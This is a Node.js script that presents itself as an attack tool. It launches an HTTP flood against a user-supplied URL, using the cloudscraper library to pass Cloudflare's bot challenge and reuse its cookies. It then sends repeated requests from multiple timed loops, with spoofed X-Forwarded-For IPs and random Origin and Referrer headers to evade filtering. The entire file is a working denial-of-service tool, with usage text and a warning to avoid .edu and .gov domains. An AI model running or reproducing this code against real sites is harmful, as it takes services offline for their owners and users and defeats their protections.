require('dotenv').config();
const cloudscraper = require('cloudscraper');
const request = require('request');

const url = process.env.URL;
const threads = Number(process.env.THREADS) || 1;

if (!url || !threads) {
    console.log(`[Usage] node api/index.js <url> <threads>`);
    console.log(`[Example] node api/index.js example.com 10`);
    console.log(`[Warning] Do not use on .edu .gov domains`);
    process.exit(-1);
}

const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

console.log(`[Info] Starting attack on ${url} with ${threads} threads`);

for (let i = 0; i < threads; i++) {
    setInterval(() => {
        cloudscraper.get(url, function (error, response, body) {
            if (error) return;
            const cookie = response.request.headers.cookie;
            const useragent = response.request.headers['User-Agent'];
            const ip = rIp();
            request({
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': 'http://' + rStr(8) + '.com',
                    'Referrer': 'http://google.com/' + rStr(10),
                    'X-Forwarded-For': ip
                }
            });
        });
    }, 1000);
}

process.on('uncaughtException', (err) => {
    console.error(`Uncaught Exception: ${err.message}`);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(`Unhandled Rejection at: ${promise}, reason: ${reason}`);
});
